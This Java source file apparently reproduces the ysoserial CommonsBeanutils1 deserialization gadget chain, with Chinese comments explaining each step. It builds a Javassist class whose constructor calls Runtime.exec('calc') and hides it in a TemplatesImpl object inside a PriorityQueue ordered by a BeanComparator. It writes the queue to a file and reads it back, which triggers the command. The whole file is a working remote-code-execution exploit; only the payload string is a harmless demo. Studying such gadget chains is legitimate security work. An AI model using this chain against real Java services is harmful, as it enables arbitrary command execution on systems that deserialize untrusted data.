package com.r17a.ysoserial;

import com.r17a.annotation.Dependencies;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.supeream.serial.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.PriorityQueue;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils1{

	public static void main(final String[] args) throws Exception {
		final Object templates = getEvilTemplatesImpl();
		// mock method name until armed
		final BeanComparator comparator = new BeanComparator("lowestSetBit");

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "outputProperties");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;

		FileOutputStream fileOutputStream = new FileOutputStream(new File("E:\\test.ser"));
		ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
		objectOutputStream.writeObject(queue);

		FileInputStream fileInputStream = new FileInputStream(new File("E:\\test.ser"));
		ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
		objectInputStream.readObject();
	}

	private static TemplatesImpl getEvilTemplatesImpl() throws Exception {
		ClassPool pool = ClassPool.getDefault();//ClassPool对象是一个表示class文件的CtClass对象的容器
		CtClass cc = pool.makeClass("Evil");//创建Evil类
		cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//设置Evil类的父类为AbstractTranslet
		CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);//创建无参构造函数
		cons.setBody("{ Runtime.getRuntime().exec(\"calc\"); }");//设置无参构造函数体
		cc.addConstructor(cons);
		byte[] byteCode = cc.toBytecode();//toBytecode得到Evil类的字节码
		byte[][] targetByteCode = new byte[][]{byteCode};
		TemplatesImpl templates = TemplatesImpl.class.newInstance();
		setFieldValue(templates, "_bytecodes", targetByteCode);
		setFieldValue(templates, "_class", null);
		setFieldValue(templates, "_name", "xx");
		setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
		return templates;
	}

	//通过反射为obj的属性赋值
	private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
		Field field = obj.getClass().getDeclaredField(fieldName);
		field.setAccessible(true);
		field.set(obj, value);
	}
}
